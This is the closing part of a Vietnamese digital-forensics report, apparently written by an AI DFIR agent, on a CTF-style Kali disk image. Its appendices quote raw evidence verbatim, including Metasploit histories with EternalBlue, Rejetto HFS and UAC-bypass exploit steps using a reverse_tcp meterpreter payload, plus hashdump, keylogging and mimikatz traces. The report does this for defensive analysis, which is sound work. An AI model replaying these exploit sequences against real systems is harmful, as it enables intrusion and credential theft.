| **E-08** | `root/Downloads/mimikatz_trunk.zip` (hash 6.2); `root/Desktop/mimikatz/{mimikatz.exe, mimidrv.sys, mimilib.dll}` | `sigcheck_file` (error: AV-quarantined); `Get-FileHash` (zip) | AV host: "file contains a virus or potentially unwanted software"; `mimikatz.exe` biến mất khỏi workspace (1831→1830 file) | IOCs; ATT&CK CredAccess (chương trình chuẩn bị sẵn) | Bộ credential-dumper Windows tồn tại trên host + AV tự động phát hiện = bằng chứng độc lập về ý đồ dump credential |
| **E-09** | `root/Documents/myfirsthack/didyouthinkwedmakeiteasy.jpg` (1.865 B, hash 6.2) | Fallback khai báo: đọc magic bytes (read-only) | Header hex `20 20 20 20 31 20 20 6d 73 66...` = text `    1  msfconsole`; tail = dòng 86-87 history | Loại trừ: stego/C2 dữ liệu giấu trong ảnh; Vector (decoy CTF) | Magic bytes phủ nhận định dạng JPEG — loại khả năng giấu payload trong ảnh |
| **E-10** | `var/log/wtmp` + `syslog` 03-22 05:16:48 | `extract_strings` + grep | `System is rebooting` + record `root/shutdown` | Timeline (điểm kết thúc cửa sổ sự kiện) | Khớp 2 nguồn độc lập về thời điểm host dừng hoạt động trước acquire |
| **E-11** | `root/Pictures/keys.txt` (130 B, hash 6.2) | Fallback khai báo: read_file | `<Right Shift><flag<Right Shift>>flag...` | Vector (CTF artifact) | File "flag" kiểu CTF do chính user tạo (`touch keys.txt` dòng 94 history) — khớp nguồn thứ hai |
| **E-12** | `boot/config-4.13.0-kali1-amd64` | Fallback khai báo: grep read-only | Tên file + nội dung config kernel Kali 4.13.0-kali1 | Vector (định danh OS = Kali) | Kernel config xác nhận bản phân phối Kali Linux 2018.x |
| **E-13** | `root/irZLAohL.jpeg` (130.859 B, hash 6.2) | `Get-FileHash` | — | (phân loại: không phải IOC) | Đăng ký để loại trừ: screenshot thông thường, không liên quan hành vi tấn công |

*Quy tắc liên kết: mọi dòng Attack Vector/Timeline ở §3–§4 đều gắn mã E-##; các vector bị loại (brute-force, stego, persistence) có bằng chứng âm E-03/E-07/E-09/E-12.*

---

## 10. PHỤ LỤC — RAW TOOL OUTPUTS (verbatim)

### A.1 `verify_evidence_integrity` (eztools) — FirstHack.ad1
```text
=== EVIDENCE INTEGRITY VERIFICATION (ISO/IEC 27037) ===
Target File: C:\Users\Acer\Downloads\64-Insider\temp_extract_dir\c46-FirstHack\FirstHack.ad1
Size: 87,719,990 bytes (83.66 MB)
MD5:    e27ee6ce0fff0d6c93de2b8816741cab
SHA-1:  434912b167889a5d992855917f80651f1274563b
SHA-256:130d91294aaa402a7a8770e5b81aabc76cb333019cf07a795b91cb9d4f72fe5b

Companion Metadata Found: C:\Users\Acer\Downloads\64-Insider\temp_extract_dir\c46-FirstHack\FirstHack.ad1.txt
- MD5 vs Metadata: NO MATCH / NOT FOUND
- SHA-1 vs Metadata: NO MATCH / NOT FOUND

--- METADATA SNIPPET ---
Created By AccessData FTK Imager 4.5.0.3
Information for D:\Users\Mawso3a\Desktop\FirstHack.ad1:
[Custom Content Sources]
 Horcrux.E01:Partition 5 [14304MB]:NONAME [ext4]|[root]|boot|*(Wildcard,Consider Case,Include Subdirectories)
 Horcrux.E01:Partition 5 [14304MB]:NONAME [ext4]|[root]|var|log|*(Wildcard,Consider Case,Include Subdirectories)
 Horcrux.E01:Partition 5 [14304MB]:NONAME [ext4]|[root]|root|*(Wildcard,Consider Case,Include Subdirectories)
[Computed Hashes]
 MD5 checksum:    f7c4fab05c3a7473ed59b549eef5a509
 SHA1 checksum:   8875899aa4c6498b410250d48503f64e283528e9
Image information:
 Acquisition started:   Tue May 25 15:33:49 2021
 Acquisition finished:  Tue May 25 15:34:32 2021
 Segment list:
  D:\Users\0xMohammed\Desktop\FirstHack.ad1
Image Verification Results:
 Verification started:  Tue May 25 15:34:33 2021
 Verification finished: Tue May 25 15:34:39 2021
 MD5 checksum:    f7c4fab05c3a7473ed59b549eef5a509 : verified
 SHA1 checksum:   8875899aa4c6498b410250d48503f64e283528e9 : verified
```

### A.2 `ad1_list` / `ad1_extract` (network_memory)
```text
Contents of '/' in ...\FirstHack.ad1:
- Partition 5 [14304MB]:NONAME [ext4]

Successfully extracted 1831 files from AD1 to 'E:\Hunting-Forensics\workspaces\c46_firsthack_evidence'!
```
*(Lần extract đầu ra `c46-FirstHack\extracted` bị mất sau khi host prune workspace — extract lại thành công; kết quả 2 lần đồng nhất 1.831 file.)*

### A.3 `root/.msf4/logs/framework.log` — các dòng timestamp quan trọng (verbatim, trích từ grep 175 dòng)
```text
[03/21/2019 16:46:04] [i(0)] core: windows/meterpreter/reverse_tcp: iteration 1: Successfully encoded with encoder x86/shikata_ga_nai (size is 308)
[03/21/2019 16:50:29] [e(0)] meterpreter: core_channel_open: Operation failed: The filename, directory name, or volume label syntax is incorrect.
  (call stack: stdapi/fs/file.rb:517 _open / :468 initialize / :278 new / upload_file → cmd_upload)   [lặp tại 16:50:50, 16:51:04, 16:51:28, 16:51:37, 16:51:41]
[03/21/2019 17:01:35] [e(0)] core: /usr/share/metasploit-framework/modules/exploits/linux/smtp/haraka.rb failed to load due to the following error:
  No such file or directory @ rb_sysopen - .../haraka.rb
[03/21/2019 17:02:29] [e(0)] meterpreter: priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
  (call stack: priv.rb:92 sam_hashes → cmd_hashdump)
[03/21/2019 17:11:17] [e(0)] meterpreter: stdapi_sys_process_execute: Operation failed: Access is denied.
[03/21/2019 17:11:30] [e(0)] meterpreter: stdapi_sys_process_execute: Operation failed: The system cannot find the file specified.
[03/21/2019 19:35:52] [i(0)] core: windows/meterpreter/reverse_tcp: iteration 1: Successfully encoded with encoder x86/shikata_ga_nai (size is 308)
[03/21/2019 19:40:36] [e(0)] meterpreter: priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
[03/21/2019 19:41:57] [e(0)] meterpreter: stdapi_ui_get_keys_utf8: Operation failed: Incorrect function.
  (call stack: ui.rb:231 keyscan_dump → cmd_keyscan_dump)   [lặp tại 19:42:02, 19:42:54]
```

### A.4 `extract_strings` (sysinternals) — `var/log/wtmp` (chú thích: file 14.592 B; kết quả là chuỗi record btmp/wtmp dạng ASCII của root)
```text
reboot
4.13.0-kali1-amd64
runlevel
4.13.0-kali1-amd64
root
shutdown
4.13.0-kali1-amd64
reboot
4.13.0-kali1-amd64
runlevel
4.13.0-kali1-amd64
root
shutdown
4.13.0-kali1-amd64
... (chuỗi reboot/runlevel/shutdown root lặp lại ~20 lần)
root
reboot
4.13.0-kali1-amd64
runlevel
4.13.0-kali1-amd64
root
shutdown
4.13.0-kali1-amd64
```

### A.5 `root/.bash_history` — verbatim (95 dòng, toàn bộ)
```text
msfconsole
systemctl status postgresql
systemctl enable postgresql
systemctl start postgresql
msfconsole
msfdb init
msfconsole
shutdown now
touch snky snky > /root/Desktop/SuperSecretFile.txt
cat snky snky > /root/Desktop/SuperSecretFile.txt 
msfconsole 
clear
history
clear
history
whoami
hack
do hack
do hack please
i am a hacker
how to hack
pwd
ls
ls -la
touch delete-me.txt
rm delete-me.txt 
ls
cd Documents/
mkdir myfirsthack
cd myfirsthack/
touch hellworld.sh
vim hellworld.sh 
chmod +x hellworld.sh 
./hellworld.sh 
touch firstscript
vim firstscript 
chmod +x firstscript 
./firstscript 
vim firstscript 
cp firstscript firstscript_fixed
ls
vim firstscript
vim firstscript_fixed 
./firstscript_fixed 
flag<this is a flag>
ifconfig
cd ..
cd..
cd ..
cd /var/log/
ls
cd ..
cd ~
ls
pwf
pwd
top
wall -h
wall yolo
ls
pwd
cd ..
ls
cd home/
ls
cd /root
ls
cd ../root
cd ../root/Documents/myfirsthack/../../Desktop/
sl
ls
cd ../Documents/myfirsthack/
netstat
echo bob.txt
touch bob.txt 
echo "If you're still reading this file, scream cake."
echo "Seriously, we'll give you a hint to answer question if you scream cake."
sudo visudo
ls
sudo ifng
ifconfi
apt get moo
sudo apt get moo
sudo apt install moo
sudo apt-install moo
sudo apt-get install moo
lol Castro just failed at all these commands. Someone pat him on the back. 
I tried okay
history > history.txt
binwalk didyouthinkwedmakeiteasy.jpg 
clear
history
exit
touch keys.txt
pwd
```

### A.6 `root/.msf4/history` — verbatim (68 dòng, toàn bộ)
```text
hosts
exit
hosts
exit
db_nmap -sV -O -T5 -Pn 10.0.0.101
db_nmap -sV -O -T5 -Pn 10.0.0.101 -oX ~/nmap_out.xml
db_nmap -sV -O -T5 -Pn 10.0.0.101 -oX /root/nmap_out.xml
search eternal
use exploit/windows/smb/ms17_010_eternalblue
options
set RHOST 10.0.0.101
run
show payloads
use windows/x64/shell/reverse_tcp
search eternal
use exploit/windows/smb/ms17_010_eternalblue
show payloads
set payload windows/x64/meterpreter/reverse_tcp
options
run
workspace
workspace -a Bob
workspace Bob 
workspace 
db_nmap -sS -T4 10.0.0.101
db_nmap -sV -T4 10.0.0.101
show services
show service
services
workspace Bob 
search rejetto
info rejetto
use exploit/windows/http/rejetto_hfs_exec 
info
hosts
set RhOST 10.0.0.101
show infor
show info
run
sessions
sessions
sessions
sessions 1
search psexec
search psexec platform:windows
sessions 1
use exploit/windows/local/bypassuac
use exploit/windows/local/bypassuac_fodhelper 
options
set SESSION 1
options
run
sessions
options
set target Windows x64
options
run
sessions 1
db_nmap -sS -T4 10.0.0.101
db_nmap -sV -T4 10.0.0.101
exit
workspace Bob 
hosts
search rejetto
use exploit/windows/http/rejetto_hfs_exec 
show info
hosts
set RhOST 10.0.0.101
```

### A.7 `sigcheck_file` (sysinternals) — `root/Desktop/mimikatz/mimikatz.exe` (verbatim)
```text
Sigcheck v2.92 - File version and signature viewer
Copyright (C) 2004-2026 Mark Russinovich
Sysinternals - www.sysinternals.com

e:\hunting-forensics\workspaces\c46_firsthack_evidence\root\desktop\mimikatz\mimikatz.exe:

	Verified:  Error accessing file

	Link date: n/a
	Publisher: n/a
	MD5: n/a
	SHA1: n/a
	SHA256: n/a
```
*Kèm theo, `Get-FileHash` đối với `mimidrv.sys`/`mimilib.dll` trả về: "The file ... cannot be read: Operation did not complete successfully because the file contains a virus or potentially unwanted software."*

### A.8 Magic bytes — `didyouthinkwedmakeiteasy.jpg` (read-only, khai báo)
```text
Header hex: 20 20 20 20 31 20 20 6d 73 66 63 6f 6e 73 6f 6c 65 0a 20 20 20 20 33 20 20 73 79 73 74 65 6d 63...
Header ascii: "    1  msfconsole.    2  systemc..."
Tail ascii: "...on the back. .   86  I tried okay.   87  history > history.txt."
→ File là TEXT (bản dump .bash_history), không phải JPEG.
```

### A.9 Auth/syslog markers (khai báo read-only) — trích verbatim
```text
Mar 20 11:23:42 KarenHacker gdm-password]: pam_unix(gdm-password:session): session opened for user root by (uid=0)
Mar 20 11:26:22 KarenHacker su[4060]: pam_unix(su:session): session opened for user postgres by (uid=0)   [×6 → su[4114]]
Mar 21 08:54:31 KarenHacker gdm-password]: pam_unix(gdm-password:session): session opened for user root by (uid=0)
Mar 21 09:04:40 KarenHacker gdm-password]: pam_unix(gdm-password:session): session opened for user root by (uid=0)
Mar 21 16:14:10 KarenHacker gdm-password]: pam_unix(gdm-password:session): session opened for user root by (uid=0)
Mar 21 16:18:22 KarenHacker rsyslogd: [origin software="rsyslogd" swVersion="8.29.0" x-pid="514" ...] rsyslogd was HUPed
Mar 22 05:16:14 KarenHacker systemd: pam_unix(systemd-user:session): session opened for user root by (uid=0)
Mar 22 05:16:48 KarenHacker systemd-logind[459]: System is rebooting.
Grep "sshd|Failed password|Accepted ... from|Invalid user" trên auth.log(.1)+syslog(.1): 0 matches.
```

### A.10 `aift_start_triage` — kết quả (verbatim)
```json
{"run_id":"726b5ca3-4946-4cc6-af04-f7aef2a53a15","status":"failed","phase":"parsing",
 "errors":["All evidence images failed to process."],"percentage":0.0}
```
*→ AIFT 2.0 dissect không hỗ trợ container AD1; chuyển `ad1_extract` (thành công).*

---

*Báo cáo kết thúc — V-AutoFor DFIR Agent, 2026-11-10. Mọi kết luận đã liên kết 1:1 với Evidence Register (E-01…E-13) và raw output ở Phụ lục A; đối chiếu telemetry tại ForBrain Monitor (port 5000).*
